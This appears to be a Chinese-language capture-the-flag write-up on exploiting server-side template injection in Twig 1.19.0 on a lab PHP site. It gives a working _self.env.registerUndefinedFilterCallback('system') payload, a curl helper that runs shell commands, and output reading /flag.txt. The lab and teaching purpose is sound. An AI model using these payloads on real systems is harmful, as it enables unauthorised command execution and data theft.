## 题解

### 入口与指纹

`Apache/2.4.56` + **`X-Powered-By: PHP/8.0.30`**，端口 8080，标题 `Submit a username`。

表单只有一个 `name` 字段，POST 回自身。提交后页面会回显一句话，**并把模板引擎版本也印出来**：

```html
<strong>test is in stock! Come back and test another one. </strong>
<br/>Twig version: 1.19.0
<br/>Loaded extension: core, escaper, optimizer
```

`Twig version: 1.19.0` 是整道题最关键的一行——1.x 早期版本的 SSTI 可以直通 RCE。

### 关键观察

**1. `name` 被拼进 Twig 模板。**

| 输入 | 回显 |
| --- | --- |
| `test` | `test is in stock!` |
| `{{7*7}}` | **`49 is in stock!`** |

**2. 双引号会被 HTML 转义，必须用单引号。**

```text
name={{_self.env.registerUndefinedFilterCallback("exec")}}…
# Twig_Error_Syntax: Unexpected character "&" in "…&quot;exec&quot;…"
```

因为 `name` 在进入模板前已经被 `htmlspecialchars` 处理，`"` 变成了 `&quot;`，
模板解析时看到的是 `&`。改用 Twig 的单引号字符串即可。

**3. `_self.env` 是 Twig 1.x 的标准 RCE 原语。**

```twig
{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
```

```html
<strong>uid=33(www-data) gid=33(www-data) groups=33(www-data) is in stock!</strong>
```

`registerUndefinedFilterCallback` 把「未知 filter 的兜底回调」注册成 `system`，
随后 `getFilter('id')` 触发它，参数就是 `id`。

### 利用链

```bash
T=$(head -1 .target)
rce() {
  curl -sS --data-urlencode "name={{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('$1')}}" \
    "http://$T/"
}

rce 'id'
rce 'ls /; cat /flag.txt'
```

```text
bin boot dev etc flag.txt home …
flag{c9ebaddf-702a-47da-9ab3-9906afe658fe}
```

### flag 位置

容器根目录的 `/flag.txt`（小写）。

## 复盘

- **页面把引擎版本印出来，等于直接给答案。** `Twig version: 1.19.0` +
  `Loaded extension: core, escaper, optimizer` 这行是开发调试遗留，
  也是本题的题眼。看到模板回显 + 版本号，先测 `{{7*7}}`。
- **`{{7*7}}` 是最小 SSTI 探针。** 返回 `49` 即确认模板求值；顺带也验证了
  引擎是 Twig（Jinja2 同样返回 49，但后续 payload 不同）。
- **注意输入编码层。** 本题 `name` 先经过 HTML 转义再进模板，
  所以双引号变成 `&quot;` 导致语法错误。**Twig 单引号字符串**绕开这一层；
  这类「先转义再渲染」的组合很常见，遇到 `Unexpected character "&"` 就该想到。
- **`_self.env` 依赖版本。** Twig ≥1.20/2.x 默认禁用了 `registerUndefinedFilterCallback`
  这条路（需要 sandbox 绕过），所以先读版本再选 payload 更省时间。
- **命令回显直接落在页面上。** 不需要反弹 shell，也不需要写文件外带。
